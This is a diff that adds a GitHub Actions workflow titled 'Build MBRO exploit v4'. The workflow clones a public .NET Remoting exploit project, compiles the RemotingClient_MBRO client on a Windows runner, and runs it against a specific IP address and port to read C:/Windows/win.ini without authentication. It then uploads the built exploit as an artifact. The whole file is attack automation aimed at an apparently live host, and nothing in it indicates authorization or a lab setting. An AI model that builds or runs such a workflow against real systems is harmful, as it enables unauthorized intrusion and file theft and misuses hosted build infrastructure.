@@ -1,0 +1,38 @@
+name: Build MBRO exploit v4
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Install .NET 4.5 targeting pack
+        run: |
+          choco install netfx-4.5-devpack -y --no-progress 2>&1 | Select-Object -Last 5
+
+      - name: Clone and build
+        run: |
+          git clone https://github.com/securifera/NewRemotingTricks C:\exploit
+          
+          $vs = & "C:\Program Files (x86)\Microsoft Visual Studio\Installer\vswhere.exe" -latest -products * -requires Microsoft.Component.MSBuild -find MSBuild\**\Bin\MSBuild.exe 2>$null | Select-Object -First 1
+          if (-not $vs) { $vs = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\MSBuild\Current\Bin\MSBuild.exe" }
+          
+          $proj = Get-ChildItem -Path C:\exploit -Recurse -Filter "RemotingClient_MBRO.csproj" | Select-Object -First 1
+          Write-Host "Project: $($proj.FullName)"
+          
+          & $vs $proj.FullName /p:Configuration=Release /verbosity:minimal 2>&1 | Select-Object -Last 10
+          
+          $exe = Get-ChildItem -Path C:\exploit -Recurse -Filter "RemotingClient_MBRO.exe" | Select-Object -First 1
+          if ($exe) {
+            Write-Host "=== Built: $($exe.FullName) ==="
+            Write-Host "=== File read attempt: 138.207.64.28:10004 (no AuthKey) ==="
+            & $exe.FullName tcp://138.207.64.28:10004/ProofOfConcept "file:///C:/Windows/win.ini" 2>&1
+            Write-Host "=== Done. Exit: $LASTEXITCODE ==="
+          } else {
+            Write-Host "Build failed"
+          }
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mbro-v4
+          path: C:\exploit\RemotingClient_MBRO\bin\Release\**
